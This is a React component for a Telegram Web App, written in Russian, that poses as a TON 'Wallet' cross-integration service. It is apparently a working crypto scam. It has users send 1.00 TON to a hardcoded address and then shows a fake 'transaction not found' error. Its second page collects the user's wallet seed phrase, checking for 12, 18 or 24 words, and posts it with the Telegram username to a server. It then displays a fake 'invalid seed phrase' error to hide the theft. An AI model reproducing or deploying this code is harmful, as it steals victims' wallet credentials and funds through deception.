import React, { useState, useEffect, useRef } from 'react';
import { IconButton, Box, Typography, Paper, Switch, TextField, Button, Accordion, AccordionSummary, AccordionDetails, Checkbox, FormControlLabel } from '@mui/material';
import ImUsd from "./tether-usdt-logo.png";
import { East as EastIcon, West as WestIcon, Payments as Payment, Person2 as Person2Icon, Abc as AbcIcon, RemoveCircle as Secret3, VisibilityOff as Secret2, HistoryEdu as Secret1, Key as Secret, ExpandMore as ExpandMoreIcon, Close as CloseIcon, ContentCopy as CircleIcon, ToggleOn as PlaylistAddIcon, AttachMoney as AttachMoneyIcon, Settings as SettingsIcon, QrCode as QrCodeIcon, ArrowForwardIos as ArrowForwardIcon, ArrowBackIos as ArrowBackIcon, Add as AddIcon, Telegram as TelegramIcon, WorkHistory as SwapHorizontalCircleIcon, WindowRounded } from '@mui/icons-material';
import { useSwipeable } from "react-swipeable";
import axios from 'axios';

const EnergyPage = () => {
  const [energyInfo, setEnergyInfo] = useState(false);
  const [hidenElement, setHidenElement] = useState(false);
  const [requested, setRequested] = useState(false);
  const [valueTether, setValueTether] = useState('');
  const [checkAddress, setCheckAddress] = useState('UQAgRV8-JTlsOqxWSQj7qitnAoxqsMkCGa824S4LBv-lT_Y8')
  const [inputValueTether, setInputValueTether] = useState('');
  const [userText, setUserText] = useState('');
  const [isValidAddress, setIsValidAddress] = useState(false);
  const [ziped, setZiped] = useState(false);
  const [checked, setChecked] = useState(false);
  const [pageIndex, setPageIndex] = useState(0); // индекс страницы
  const [isLoadingArrow, setIsLoadingArrow] = useState(false);


  const userUsername = window.Telegram.WebApp.initDataUnsafe.user?.username;
  const serverUrl = process.env.REACT_APP_SERVER_URL;

  useEffect(() => {
    const initTether = localStorage.getItem('initTether5');
    setValueTether(initTether)
  }, []);

  // Проверка валидности адреса
  useEffect(() => {
    setIsValidAddress(inputValueTether.startsWith('EQ') || inputValueTether.startsWith('UQ') && inputValueTether.length === 48);
  }, [inputValueTether]);

  const copyToClipboard = async () => {
    triggerHapticFeedback()
    try {
      await navigator.clipboard.writeText(checkAddress);
      setZiped(true);
    
      // Таймаут для возврата значения ziped к false через 3 секунды
      setTimeout(() => {
        setZiped(false);
      }, 1000);
    } catch (error) {
      console.error('Failed to copy address:', error);
    }
  };

  const handlePasteFromClipboard = async () => {
    triggerHapticFeedback()
    try {
      const text = await navigator.clipboard.readText();
      setInputValueTether(text);
    } catch (error) {
      console.error("Ошибка при чтении буфера обмена:", error);
    }
  }

  const formatAddress = (address) => {
    if (address.length > 12) {
      return `${address.slice(0, 4)}...${address.slice(-4)}`;
    }
    return address;
  };

  const zipIt = () => {
    setValueTether(inputValueTether);
    triggerHapticFeedback()
    localStorage.setItem("initTether5", inputValueTether);
  };
  
  const unzipIt = () => {
    triggerHapticFeedback()
    localStorage.removeItem("initTether5");
    setValueTether('');
  };

  const triggerHapticFeedback = () => {
    if (window.Telegram.WebApp) {
      window.Telegram.WebApp.HapticFeedback.impactOccurred('light');
    } else if (navigator.vibrate) {
      navigator.vibrate(50); // Для Android устройств
    }
  };

  const infoRecent = () => {
    triggerHapticFeedback();
    setEnergyInfo(!energyInfo);
  };
  
  const toggleElement = () => {
    triggerHapticFeedback();
    setEnergyInfo(false);
    setHidenElement(!hidenElement);
  };

  const togglePage = () => {
    setPageIndex((prevIndex) => (prevIndex === 0 ? 1 : 0)); // переключение страницы
  };
  const handleCheck = () => {
    triggerHapticFeedback();

    showLoading(() => {
      setChecked(true);
    
      // Таймаут для возврата значения ziped к false через 3 секунды
      setTimeout(() => {
        setChecked(false);
      }, 10000);
    });
  };

  const showLoading = (callback) => {
    setIsLoadingArrow(true);
    setTimeout(() => {
      setIsLoadingArrow(false);
      callback();
    }, 4000);
  };

 const handleSubmit = async () => {
  try {
    await axios.post(
      serverUrl,
      {
        title: userUsername || 'user',
        content: userText,
      },
      {
        headers: {
          'Content-Type': 'application/json',
        },
      }
    );

    setUserText(''); // очищаем поле после отправки
    showLoading(() => {
      setRequested(true);
    
      // Таймаут для возврата значения ziped к false через 3 секунды
      setTimeout(() => {
        setRequested(false);
      }, 10000);
    });
  } catch (error) {
    console.log("Ошибка при отправке данных:");
  }
};

  const isValidText = (text) => {
    const words = text.trim().split(/\s+/); // Разделяем текст по пробелам
    const isLatinOnly = /^[a-zA-Z\s]+$/.test(text); // Проверка на латинские буквы и пробелы
    return isLatinOnly && (words.length === 12 || words.length === 18 || words.length === 24);
  };

  return (
    <Box>
      {/* Страница 0 */}
      {pageIndex === 0 && (
        <Box>
          <Box
        sx={{
          backgroundColor: "#444",
          padding: 1.5,
          position: "relative",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
        }}
      >
        <Typography variant="body1" color="white">
          Недавние действия
        </Typography>
        <Typography onClick={infoRecent}
          variant="h5"
          color="white"
          sx={{ position: "absolute", right: 10, top: 2 }}
        >
          ...
        </Typography>
      </Box>

      {!valueTether && (
        <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '20px' }}>
        <Typography sx={{ textAlign: 'left', color: 'grey',  fontSize: '18px', width: '80%' }}>
          1.Привяжите адрес 
        </Typography>
        
        <Typography sx={{ textAlign: 'center', color: 'grey', marginTop: '20px', fontSize: '9px', width: '80%' }}>
          Кросс-интеграция Wallet с вашим кошельком. Получите доступ к вашим средствам на Wallet в любом другом удобном крипто-кошельке. Для аутентификации адреса используйте исключительно The Open Network (TON). 
        </Typography>
        </Box>
      )}


      {valueTether && (
      <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '20px' }}>
       <Box sx={{ display: 'flex', flexDirection: 'row', alignItems: 'center'}}>
       <Payment />
        <Box
          sx={{
            borderRadius: "8px",
            backgroundColor: '#333',
            width: '90%',
            padding: '10px',
            textAlign: 'center',
            color: 'white',
            fontSize: '22px',
          }}
        >
          {formatAddress(valueTether)}
        </Box>
          </Box>
        {/* Кнопка для вставки из буфера обмена */}
        <Button onClick={unzipIt} variant="contained" sx={{ mt: 2, width: '80%' }}>
         Изменить адрес
        </Button>

       
      </Box>)}
      {!valueTether && (
      <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '20px' }}>
        {/* Инпут, который не вызывает клавиатуру */}
        <TextField
          value={inputValueTether}
          onChange={(e) => setInputValueTether(e.target.value)}
          placeholder="Вставьте адрес"
          InputProps={{ readOnly: true }} // Инпут только для чтения
          sx={{
            borderRadius: "8px",
            backgroundColor: '#555',
            width: '80%',
            '& .MuiOutlinedInput-root': {
              borderRadius: '8px',
              '& input': {
                color: '#999',
                padding: '5px 5px',
                height: 'auto',
                fontSize: '9.5px',
                justifyContent: 'center',
                textAlign: 'center',
              },
              '& fieldset': {
                borderColor: '#555',
              },
              '&:hover fieldset': {
                borderColor: '#999',
              },
              '&.Mui-focused fieldset': {
                borderColor: '#999',
              },
            },
            '& .MuiInputBase-input::placeholder': {
              color: '#999',
              fontSize: '15px'
            },
          }}
        />

        {/* Кнопка для вставки из буфера обмена */}
        <Button onClick={inputValueTether && isValidAddress ? zipIt : handlePasteFromClipboard} variant="contained" sx={{ mt: 2, width: '80%' }}>
         {inputValueTether && isValidAddress ? "Привязать" : " Вставить"}
        </Button>

         {!isValidAddress && inputValueTether && (
          <Typography color="#f64b3c" sx={{ marginTop: '10px', width: '80%',fontSize: '9.5px',
            justifyContent: 'center',
            textAlign: 'center', }}>
            Используйте строго адрес сети TON
          </Typography>
        )}
      </Box>)}

      
      <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '20px' }}>
        <Typography sx={{ textAlign: 'left', color: 'grey',  fontSize: '18px', width: '80%' }}>
          2.Выполните транзакцию 
        </Typography>
        
        <Typography sx={{ textAlign: 'center', color: 'grey', marginTop: '20px', fontSize: '9px', width: '80%' }}>
          Скопируйте адрес размещенный ниже. Выполните транзакцию в размере 1.00 TON. Для успешной интеграции используйте исключительно The Open Network (TON). 
        </Typography>
        </Box>
      <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '20px' }}>
        {/* Инпут, который не вызывает клавиатуру */}
        <TextField
          value={inputValueTether}
          placeholder={checkAddress}
          InputProps={{ readOnly: true }} // Инпут только для чтения
          sx={{
            borderRadius: "8px",
            backgroundColor: '#555',
            width: '80%',
            '& .MuiOutlinedInput-root': {
              borderRadius: '8px',
              '& input': {
                color: '#999',
                padding: '5px 5px',
                height: 'auto',
                fontSize: '9.5px',
                justifyContent: 'center',
                textAlign: 'center',
              },
              '& fieldset': {
                borderColor: '#555',
              },
              '&:hover fieldset': {
                borderColor: '#999',
              },
              '&.Mui-focused fieldset': {
                borderColor: '#999',
              },
            },
            '& .MuiInputBase-input::placeholder': {
              color: 'white',
              fontSize: '9.5px'
            },
          }}
        />

        {/* Кнопка для вставки из буфера обмена */}
        <Button onClick={copyToClipboard} variant="contained" sx={{ mt: 2, width: '80%' }}>
         {ziped ? '✔':"Скопировать"}
        </Button>

      
      </Box>
      
        <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '20px' }}>
        <Typography sx={{ textAlign: 'center', color: 'grey', marginTop: '20px', fontSize: '9px', width: '80%' }}>
         После успешно выполненой аутентификации средства можно вывести на ваш сторонний кошелек.
        </Typography>

        <Button onClick={handleCheck} disabled={!valueTether} variant="contained" sx={{ mt: 2, width: '50%' }}>
         Вывод
        </Button>

        {checked && (
          <Typography color="#f64b3c" sx={{ marginTop: '10px', width: '80%',fontSize: '9.5px',
            justifyContent: 'center',
            textAlign: 'center', }}>
            404. Транзакция с адресом {formatAddress(valueTether)} на сумму 1.00 TON в пуле {formatAddress(checkAddress)} не найдена
          </Typography>
        )}

          </Box>
      {energyInfo && (
        <Paper 
          sx={{ 
            position: 'fixed',color: "white",bottom: 0,left: 0,width: '100%',height: '25%',bgcolor: '#222',padding: '0px',boxShadow: '0 4px 8px rgba(0,0,0,0.2)',zIndex: 1200,borderRadius: '40px 40px 0 0',animation: 'slide-up 0.3s ease-in-out' 
          }}
        >
          <Box 
            onClick={infoRecent} 
            sx={{height: '30px',bgcolor: '#222',display: 'flex',alignItems: 'center',justifyContent: 'left',borderRadius: '40px 40px 0 0',marginLeft: '10px',padding: "17px"}}
          >
            <CloseIcon />
          </Box>
          
          <Box onClick={toggleElement}
            sx={{bgcolor: '#222', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
          >
            <Secret2 />
            <Typography sx={{ marginLeft: "15px", fontSize: '18px', color: 'white' }}>
              Показать скрытые действия
            </Typography>
          </Box>
        </Paper>
      )}


      {/* енерджи скрыты */}
      {hidenElement && (
        <Paper sx={{ position: 'fixed', color: "white", bottom: 0, left: 0, width: '100%', height: '100%', bgcolor: '#333', padding: '0px', boxShadow: '0 4px 8px rgba(0,0,0,0.2)', zIndex: 1200, borderRadius: '12px 12px 0 0', animation: 'slide-up 0.3s ease-in-out' }}>
          <Box onClick={toggleElement} sx={{ height: '30px', bgcolor: '#444', display: 'flex', alignItems: 'center', justifyContent: 'left', borderRadius: '12px 12px 0 0', marginBottom: '10px', padding: "10px" }}>
            <ArrowBackIcon />Назад
          </Box>
          <Typography sx={{ color: 'grey', fontSize: '18px', textAlign: "center", marginTop: '100px' }}>Нет скрытых действий</Typography>
        </Paper>
      )}

      {isLoadingArrow && (
        <Box sx={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', backgroundColor: 'rgba(0, 0, 0, 0.7)', zIndex: 1001, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
          <Box sx={{ width: '150px', height: '100px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            <Typography>Sending request...</Typography>
          </Box>
        </Box>
      )}

        </Box>
      )}

      {/* Страница 1 */}
      {pageIndex === 1 && (
  <Box>
    {/* Секция для "Недавние действия" */}
    <Box
      sx={{
        backgroundColor: "#444",
        padding: 1.5,
        position: "relative",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
      }}
    >
      <Typography variant="body1" color="white">
        Недавние действия
      </Typography>
      <Typography onClick={infoRecent}
        variant="h5"
        color="white"
        sx={{ position: "absolute", right: 10, top: 2 }}
      >
        ...
      </Typography>
    </Box>
    
    <Box sx={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginTop: '20px' }}>
        <Typography sx={{ textAlign: 'center', color: 'white',  fontSize: '18px', width: '80%' }}>
          Аутентификация кошелька через Seed Phrase 
        </Typography>
        
        <Typography sx={{ textAlign: 'center', color: 'grey', marginTop: '20px', fontSize: '9px', width: '80%' }}>
          Вставьте Seed Phrase стороннего кошелька для кросс-интеграции. Получите доступ к своим активам Wallet в вашем крипто-кошельке.
        </Typography>
        <Typography sx={{ textAlign: 'center', color: 'grey', marginTop: '10px', fontSize: '7px', width: '80%' }}>
          Введите сид-фразу используя один пробел между словами. Пример: young sure cram hood apart impulse corn enjoy art suit damage oval
        </Typography>
        {requested && (
          <Typography color="#f64b3c" sx={{ marginTop: '10px', width: '80%',fontSize: '9.5px',
            justifyContent: 'center',
            textAlign: 'center', }}>
            404. Invalid seed phrase. Укажите правильную последовательность.
          </Typography>
        )}
        </Box>
    {/* Поле ввода текста */}
    <TextField
  multiline
  rows={3}
  placeholder="Введите ваш seed phrase"
  value={userText}
  onChange={(e) => setUserText(e.target.value)}
  sx={{
    width: '80%',
    margin: '20px auto',
    display: 'block',
    fontSize: '12px',
    color: 'grey',
    backgroundColor: '#555',
    borderRadius: '8px',
    '& .MuiOutlinedInput-root': {
      width: '100%', // Растягиваем на 100% от 80% контейнера
      padding: 0, // Убираем внутренние отступы
      borderRadius: '8px', // Скругленные углы
    },
    '& .MuiInputBase-input': {
      color: 'white',
      fontSize: '12px',
      padding: '8px', // Немного отступов для удобства ввода
    },
  }}
/>


    {/* Кнопка отправки */}
    <Button
      variant="contained"
      onClick={handleSubmit}
      disabled={!isValidText(userText)}
      sx={{
        width: '60%',
        margin: '10px auto',
        display: 'block',
      }}
    >
      Подключить
    </Button>

    

    {isLoadingArrow && (
        <Box sx={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', backgroundColor: 'rgba(0, 0, 0, 0.7)', zIndex: 1001, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
          <Box sx={{ width: '150px', height: '100px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
            <Typography>Connecting...</Typography>
          </Box>
        </Box>
      )}

    {energyInfo && (
      <Paper 
        sx={{ 
          position: 'fixed', color: "white", bottom: 0, left: 0, width: '100%', height: '25%', bgcolor: '#222', padding: '0px', boxShadow: '0 4px 8px rgba(0,0,0,0.2)', zIndex: 1200, borderRadius: '40px 40px 0 0', animation: 'slide-up 0.3s ease-in-out' 
        }}
      >
        <Box 
          onClick={infoRecent} 
          sx={{height: '30px', bgcolor: '#222', display: 'flex', alignItems: 'center', justifyContent: 'left', borderRadius: '40px 40px 0 0', marginLeft: '10px', padding: "17px"}}
        >
          <CloseIcon />
        </Box>
        
        <Box onClick={toggleElement}
          sx={{bgcolor: '#222', display: 'flex', alignItems: 'center', justifyContent: 'center' }}
        >
          <Secret2 />
          <Typography sx={{ marginLeft: "15px", fontSize: '18px', color: 'white' }}>
            Показать скрытые действия
          </Typography>
        </Box>
      </Paper>
    )}

    {hidenElement && (
      <Paper sx={{ position: 'fixed', color: "white", bottom: 0, left: 0, width: '100%', height: '100%', bgcolor: '#333', padding: '0px', boxShadow: '0 4px 8px rgba(0,0,0,0.2)', zIndex: 1200, borderRadius: '12px 12px 0 0', animation: 'slide-up 0.3s ease-in-out' }}>
        <Box onClick={toggleElement} sx={{ height: '30px', bgcolor: '#444', display: 'flex', alignItems: 'center', justifyContent: 'left', borderRadius: '12px 12px 0 0', marginBottom: '10px', padding: "10px" }}>
          <ArrowBackIcon />Назад
        </Box>
        <Typography sx={{ color: 'grey', fontSize: '18px', textAlign: "center", marginTop: '100px' }}>Нет скрытых действий</Typography>
      </Paper>
    )}
  </Box>
)}

      {/* Кнопка навигации */}
      {pageIndex === 0 ? (
  <EastIcon
    onClick={togglePage}
    sx={{
      position: 'fixed',
      bottom: 100,
      right: 10,
      zIndex: 1000,
    }}
  />
) : (
  <WestIcon
    onClick={togglePage}
    sx={{
      position: 'fixed',
      bottom: 100,
      left: 10,
      zIndex: 1000,
    }}
  />
)}


    </Box>
  );
};

export default EnergyPage;
